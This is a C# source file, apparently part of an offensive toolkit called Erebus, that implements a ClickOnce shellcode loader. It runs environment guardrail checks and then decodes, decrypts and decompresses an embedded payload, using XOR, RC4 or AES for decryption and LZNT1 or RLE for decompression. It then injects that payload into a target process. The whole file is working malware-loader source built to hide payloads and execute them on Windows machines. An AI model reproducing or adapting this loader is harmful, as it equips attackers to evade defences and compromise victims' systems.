using Erebus.ClickOnce;
using System.Runtime.Versioning;

namespace ShellcodeLoader
{
    public class ClickOnceLoader
    {
        [STAThread]
        [SupportedOSPlatform("windows")]
        public static void Main(string[] args)
        {
            string injectionMethod = InjectionConfig.InjectionMethod;
            int targetPid = InjectionConfig.TargetPID;
            byte[] shellcode = InjectionConfig.Shellcode;

            DebugLogger.WriteLine($"[*] Injection Method: {injectionMethod}");
            if (targetPid > 0)
                DebugLogger.WriteLine($"[*] Target PID: {targetPid}");

            DebugLogger.WriteLine($"[+] Initial shellcode size: {shellcode.Length} bytes");

            // ============================================================
            // GUARDRAILS CHECK: Validate environment before injection
            // ============================================================
            if (!Guardrails.RunGuardrails())
            {
                DebugLogger.WriteLine("[-] Guardrail check failed, exiting!");
                Environment.Exit(1);
            }

            // ============================================================
            // DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
            // ============================================================

            // STEP 1: DECODE
            DebugLogger.WriteLine("\n[*] STEP 1: Decoding shellcode based on configuration...");
            if (InjectionConfig.EncodingType > 0)
            {
                string rawPayload = System.Text.Encoding.ASCII.GetString(shellcode);
                DetectEncodingFormat targetFormat = (DetectEncodingFormat)InjectionConfig.EncodingType;

                DebugLogger.WriteLine($"[*] Decoding format: {targetFormat}");
                shellcode = CompressionDecodingUtils.DecodeStringByFormat(rawPayload, targetFormat);
                DebugLogger.WriteLine($"[+] Decoded payload size: {shellcode.Length} bytes");
            }
            else
            {
                DebugLogger.WriteLine("[*] No encoding configured, skipping decoding");
            }

            // STEP 2: DECRYPT
            DebugLogger.WriteLine("[*] STEP 2: Decrypting shellcode based on configuration...");
            switch (InjectionConfig.EncryptionType)
            {
                case 1:
                    DebugLogger.WriteLine("[+] Applying XOR decryption...");
                    shellcode = DecryptionUtils.DecryptXOR(shellcode, InjectionConfig.EncryptionKey);
                    break;

                case 2:
                    DebugLogger.WriteLine("[+] Applying RC4 decryption...");
                    shellcode = DecryptionUtils.DecryptRC4(shellcode, InjectionConfig.EncryptionKey);
                    break;

                case 3:
                    DebugLogger.WriteLine("[+] Applying AES-ECB decryption...");
                    shellcode = DecryptionUtils.DecryptAES_ECB(shellcode, InjectionConfig.EncryptionKey);
                    break;

                case 4:
                    DebugLogger.WriteLine("[+] Applying AES-CBC decryption...");
                    shellcode = DecryptionUtils.DecryptAES_CBC(shellcode, InjectionConfig.EncryptionKey, InjectionConfig.EncryptionIV);
                    break;

                default:
                    DebugLogger.WriteLine("[*] No encryption configured (EncryptionType = 0), skipping decryption");
                    break;
            }

            // STEP 3: DECOMPRESS
            DebugLogger.WriteLine("[*] STEP 3: Decompressing shellcode based on configuration...");
            switch (InjectionConfig.CompressionType)
            {
                case 1:
                    DebugLogger.WriteLine("[+] Applying LZNT1 decompression...");
                    shellcode = CompressionDecodingUtils.DecompressionLZNT(shellcode);
                    break;

                case 2:
                    DebugLogger.WriteLine("[+] Applying RLE decompression...");
                    shellcode = CompressionDecodingUtils.DecompressionRLE(shellcode);
                    break;

                default:
                    DebugLogger.WriteLine("[*] No compression configured (CompressionType = 0), skipping decompression");
                    break;
            }
            DebugLogger.WriteLine($"[+] Final shellcode size: {shellcode.Length} bytes");

            try
            {
                IInjectionMethod injector = InjectionFactory.GetInjectionMethod(injectionMethod);
                DebugLogger.WriteLine($"\n[+] Using: {injector.Name}");
                DebugLogger.WriteLine($"[+] Description: {injector.Description}");
                DebugLogger.WriteLine("");

                bool success = injector.Inject(shellcode, targetPid);

                if (success)
                {
                    DebugLogger.WriteLine("\n[+] Injection completed successfully!");
                }
                else
                {
                    DebugLogger.WriteLine("\n[-] Injection failed!");
                    Environment.Exit(1);
                }
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"\n[-] Error: {ex.Message}");
                Environment.Exit(1);
            }
        }
    }
}
